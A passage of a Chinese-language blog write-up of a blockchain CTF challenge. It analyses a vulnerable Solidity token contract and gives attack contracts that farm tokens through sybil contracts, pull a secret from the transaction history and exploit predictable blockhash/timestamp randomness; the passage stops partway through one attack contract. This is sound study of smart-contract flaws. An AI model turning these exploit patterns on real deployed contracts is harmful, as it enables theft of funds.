punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">borrow</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">// 获得 1 个_balances</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        _profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">// 通过出售_ebalances 购买_balances</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">&lt;=</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token string">"max buy count is 300"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token builtin">uint</span> price<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token builtin">uint</span> ethmount <span class="token operator">=</span> _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ethmount <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ethmount <span class="token operator">>=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> ethmount <span class="token operator">&lt;=</span> <span class="token number">233</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token builtin">uint</span> payment <span class="token operator">=</span> amount <span class="token operator">*</span> price<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>payment <span class="token operator">&lt;=</span> ethmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> payment<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">sale</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">// 通过出售_balances 获得_ebalances</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"fail to sale"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token builtin">uint</span> earn <span class="token operator">=</span> amount <span class="token operator">*</span> tokenprice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> earn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>我们看看 <code>profit</code>  这个函数，只能运行一次，获得一个 <code>_balances</code> ; 而 <code>borrow</code>  这个函数，一共可以执行两次获得两个 <code>_balances</code> . 但是这两个函数都有 <code>_profited[msg.sender]</code>  这个变量进行限制，也就是说，我们<strong>最多</strong>只能通过 <code>profit</code>  或 <code>borrow</code>  函数获得<strong> 2 个</strong> <code>_balances</code> .</p>
<p>那么 <code>_balances</code>  有什么用呢？看一看 <code>sale</code>  函数，我们可以把 <code>_balances</code>  卖掉得到 <code>_ebalances</code> , 其中 <code>tokenprice</code>  已经被定义为 6 了，所以 <code>_balances</code>  与 <code>_ebalances</code>  之间的兑换比例为 1:6.</p>
<p>而 <code>buy</code>  这个函数，只有当 <code>_ebalances</code>  大于 233 时， <code>_ebalances</code>  与 <code>_balances</code>  之间的兑换比例才是 1:1.</p>
<p>仔细看看上面两段话，稍微思考一下就可以明白，只要我的 <code>_ebalances</code>  比 233 要大，那么不就可以通过与 <code>_balances</code>  互刷的方式不断增加我的 <code>_ebalances</code>  从而满足条件 2 <code>_ebalances[msg.sender] &gt;= 1812</code> ?!</p>
<p>这里我举个简单的例子，假设我现在有 <code>_ebalances</code> 300 个，那么我可以通过 <code>buy(300)</code>  获得 <code>_balances</code> 300 个，随后在通过 <code>sale(300)</code>  获得 <code>_ebalances</code> 300*6=1800 个，然后再重复上面的过程，那么我的 <code>_ebalances</code>  不久可以源源不断的增加的吗～～～～</p>
<p>所以我们现在要做的可以是:</p>
<ul>
<li>获得 <code>_ebalances</code>  大于 233 个</li>
<li>或者 <code>_balances</code>  大于等于 39 个 (因为获得 39 个以上的 <code>_balances</code>  后，可以通过 <code>sale</code>  函数获得的 <code>_ebalances</code>  的数量是 6* <code>_balances</code> , 即 234 个)</li>
</ul>
<h3 id="2编写攻击合约"><a class="anchor" href="#2编写攻击合约">#</a> 2. 编写攻击合约</h3>
<p>在求解这一题的过程中，我想到了两种方法都可以来获得 flag, 接下来听我一一道来～～</p>
<h4 id="方法1"><a class="anchor" href="#方法1">#</a> 方法①</h4>
<p>我们知道每一个初始账号都可以固定获得 2 个 <code>_balances</code> , 那么我们能否通过小号为大号通过 <code>transfer</code>  方法发送 <code>_balances</code>  的方法获得足够数量的 <code>_balances</code>  呢？答案是可行的.</p>
<p>直接上代码！</p>
<p>先写一个拿两个 <code>_balances</code>  并转给大号的合约</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.12</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./ctf.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">mulcreate</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    MyToken <span class="token keyword">public</span> mytoken<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _MyTokenAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        mytoken <span class="token operator">=</span> <span class="token function">MyToken</span><span class="token punctuation">(</span>_MyTokenAddress<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">onestep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        mytoken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">adreess</span><span class="token punctuation">(</span>你的主账户地址<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>再写一个批量创建合约的合约</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.12</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./create_contract.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">mulcreate_Factory</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  mulcreate Mulcreate<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        Mulcreate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mulcreate</span><span class="token punctuation">(</span><span class="token number">0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这个地址就是题目合约的地址</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        Mulcreate<span class="token punctuation">.</span><span class="token function">onestep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    </pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>通过调用第二个合约，给大号足够的 <code>_balances</code>  启动资金，就可以开始刷 <code>_ebalances</code>  拿 flag 咯～～</p>
<h4 id="方法2"><a class="anchor" href="#方法2">#</a> 方法②</h4>
<p>细心的同学在做这题的时候有没有发现这个函数 <code>flashloan</code> , 可以直接给你增加 300 的 <code>_ebalances</code> !</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">flashloan</span><span class="token punctuation">(</span>SignCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>loankey <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"loan key error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        </pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"hacker get out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        Signature <span class="token keyword">memory</span> sig <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>signature<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        c<span class="token operator">=</span>coupon<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>        </pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"need pre auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        </pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_loand<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"you have already loaned"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>amount <span class="token operator">&lt;=</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token string">"loan amount error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>        _loand<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        </pre></td></tr><tr><td data-num="18"></td><td><pre>        _ebalances<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">+=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>不过直接编写攻击合约来调用这个函数肯定是不行滴，因为 <code>require(msg.sender == address(this), &quot;hacker get out&quot;)</code>  这一句的限制了，咋办嘞？</p>
<p>再找找看叭～～于是我们找到了一个调用 <code>flashloan</code>  的函数 <code>testborrowtwice</code> , 这不就正好可以满足上面的条件了吗～</p>
<pre><code class="language-soidity">function testborrowtwice(SignCoupon calldata scoupon) public &#123;
        require(scoupon.coupon.loankey == 2233);
        MyToken(this).flashloan(scoupon);
    &#125;
</code></pre>
<p>不过 <code>flashloan</code>  内还有限制条件 <code>require(_authd[scoupon.coupon.buser] == 2, &quot;need pre auth&quot;)</code> , 就是说需要验证的意思，我们找找这两个验证函数 <code>auth1</code>  和 <code>auth2</code></p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">auth1</span><span class="token punctuation">(</span><span class="token builtin">uint</span> pass_<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pass_ <span class="token operator">==</span> secret<span class="token punctuation">,</span> <span class="token string">"auth fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"already authd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        _auth_one<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        _authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">auth2</span><span class="token punctuation">(</span><span class="token builtin">uint</span> pass_<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token builtin">uint</span> pass <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pass <span class="token operator">==</span> pass_<span class="token punctuation">,</span> <span class="token string">"password error, auth fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_auth_one<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"need pre auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"already authd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        _authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>对于 <code>auth1</code> , <code>secret</code>  不是直接在 <code>constructor</code>  中有定义了嘛～直接看合约</p>
<p><img data-src="/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140608227.png" alt="image-20221101140608227" style="aspect-ratio:1715 / 322;"></p>
<p>NICE！一下子就找到了根本难不倒我们～</p>
<p>但是当你开开心心的把１２３４５６输进去的时候，结果发现居然没通过？？？</p>
<p>咋回事嘞</p>
<p>再找找看咯</p>
<p>于是你再源码中发现了这个 <code>set_secret</code> ! 没想到 <code>owner</code>  还可以改 secret!!</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">set_secret</span><span class="token punctuation">(</span><span class="token builtin">uint</span> secret_<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyowner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        secret <span class="token operator">=</span> secret_<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">changeprice</span><span class="token punctuation">(</span>secret_<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这个我们玩区块链的根本不慌滴，区块链的每一笔交易都是有记录的，我们直接去看最早的交易记录.</p>
<p>嘿嘿<img data-src="/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140901701.png" alt="image-20221101140901701" style="aspect-ratio:1727 / 200;"></p>
<p>这不就有了嘛～</p>
<p>看看这笔交易的信息</p>
<p><img data-src="/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140950991.png" alt="image-20221101140950991" style="aspect-ratio:1720 / 218;"></p>
<p>嘿嘿 <code>secret</code>  就是<strong> 0x154be90</strong>, 转一下十进制就是<strong> 22331024</strong>, 还挺有寓意的嘛～</p>
<p>接下来就是搞 <code>auth2</code>  的时候了</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">auth2</span><span class="token punctuation">(</span><span class="token builtin">uint</span> pass_<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token builtin">uint</span> pass <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pass <span class="token operator">==</span> pass_<span class="token punctuation">,</span> <span class="token string">"password error, auth fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_auth_one<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"need pre auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"already authd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        _authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>当我看到 <code>uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))</code>  这个的时候，我瞬间乐开了花，这我可太熟悉不过了～</p>
<p>看看这篇文章<span class="exturl" data-url="aHR0cHM6Ly9zb2xpZGl0eS1ieS1leGFtcGxlLm9yZy9oYWNrcy9yYW5kb21uZXNzLw=="> Source of Randomness</span> 简直简直就是一个模子里刻出来的哇，</p>
<p><code>uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))</code>  这玩意儿看着随机，其实是确定的！</p>
<p>接下来写个攻击合约就可以赚到大把大把的 <code>_balances</code>  咯</p>
<p>直接上代码！</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.12</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./ctf.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    MyToken <span class="token keyword">public</span> mytoken<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _MyTokenAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//_MyTokenAddress 是题目的合约地址</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        mytoken <span class="token operator">=</span> <span class="token function">MyToken</span><span class="token punctuation">(</span>_MyTokenAddress<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">function</span> <span class="token 